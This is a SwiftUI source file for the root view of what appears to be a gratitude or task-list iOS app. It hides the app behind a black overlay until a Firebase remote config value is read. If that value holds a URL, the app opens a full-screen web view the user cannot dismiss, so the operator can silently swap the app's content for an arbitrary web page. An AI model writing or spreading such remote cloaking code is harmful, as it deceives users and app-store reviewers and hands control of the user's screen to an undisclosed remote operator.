import AdSupport
import AppTrackingTransparency
import FirebaseRemoteConfig
import Foundation
import SwiftUI

enum AppStage { case loading, onboarding, main }

struct AddTaskRoute: Identifiable {
    let id = UUID()
    let mode: AddTaskMode
}

struct DetailRoute: Identifiable {
    let id = UUID()
    let listID: UUID
}

struct WebItem: Identifiable, Equatable {
    let id = UUID()
    let url: URL
}

struct RootView: View {

    @State private var webItem: WebItem? = nil
    @State private var showBlackout: Bool = true
    @Environment(\.scenePhase) private var scenePhase

    @State private var openedURLString: String? = nil
    @State private var didHandleEmpty = false
    @State private var didRequestATT = false

    @StateObject private var model = TasksModel()
    @AppStorage("onboarding_done") private var onboardingDone = false
    @State private var stage: AppStage = .loading

    @State private var showSettings = false
    @State private var addRoute: AddTaskRoute? = nil
    @State private var detailRoute: DetailRoute? = nil

    var body: some View {
        ZStack {
            Group {
                switch stage {
                case .loading:
                    LoadingView { stage = onboardingDone ? .main : .onboarding }

                case .onboarding:
                    OnboardingView {
                        onboardingDone = true
                        stage = .main
                    }

                case .main:
                    ZStack {
                        MainView(
                            onOpenSettings: { showSettings = true },
                            onOpenAddNew: {
                                addRoute = .init(mode: .createList)
                            },
                            onEditTask: { list in
                                addRoute = .init(mode: .editList(list))
                            },
                            onOpenDetails: { list in
                                detailRoute = .init(listID: list.id)
                            }
                        )
                        .environmentObject(model)
                    }
                    .fullScreenCover(isPresented: $showSettings) {
                        SettingView()
                    }
                    .transaction { $0.disablesAnimations = true }

                    .fullScreenCover(item: $addRoute) { route in
                        AddGratitude(mode: route.mode).environmentObject(model)
                    }
                    .transaction { $0.disablesAnimations = true }

                    .fullScreenCover(item: $detailRoute) { route in
                        MainDetails(listID: route.listID)
                            .environmentObject(model)
                    }
                    .transaction { $0.disablesAnimations = true }
                }
            }
            .animation(.easeInOut, value: stage)

            if showBlackout {
                Color.black
                    .ignoresSafeArea()
                    .transition(.opacity)
                    .allowsHitTesting(true)
            }

        }
        .onAppear {

            checkRemoteURLAndOpen()
        }

        .onReceive(
            NotificationCenter.default.publisher(for: .remoteConfigUpdated)
        ) { _ in
            checkRemoteURLAndOpen()
        }

        .fullScreenCover(item: $webItem) { item in
            DetailsView(url: item.url)
                .ignoresSafeArea()
                .interactiveDismissDisabled(true)
        }
        .transaction { t in
            t.disablesAnimations = true
        }
    }

    private func checkRemoteURLAndOpen() {
        let value = RCService.rc["valueu"].stringValue
            .trimmingCharacters(in: .whitespacesAndNewlines)

        if value.isEmpty {
            guard !didHandleEmpty else {

                return
            }
            didHandleEmpty = true

            withAnimation(.easeInOut(duration: 0.5)) { showBlackout = false }

            if !didRequestATT {
                didRequestATT = true
                requestATTIfNeeded()
            }
            return
        }

        guard let url = URL(string: value) else {

            return
        }

        if openedURLString == url.absoluteString {

            return
        }

        DispatchQueue.main.async {

            self.webItem = WebItem(url: url)
            self.openedURLString = url.absoluteString

        }
    }

    private func requestATTIfNeeded() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            guard #available(iOS 14, *) else { return }

            let status = ATTrackingManager.trackingAuthorizationStatus
            guard status == .notDetermined else { return }

            ATTrackingManager.requestTrackingAuthorization { status in
                switch status {
                case .authorized:
                    print(
                        "✅ ATT authorized. IDFA:",
                        ASIdentifierManager.shared().advertisingIdentifier
                    )
                case .denied:
                    print("❌ ATT denied")
                case .notDetermined:
                    print("⚠️ ATT still notDetermined")
                case .restricted:
                    print("⛔️ ATT restricted")
                @unknown default:
                    print("❓ ATT unknown status:", status.rawValue)
                }
            }
        }
    }
}
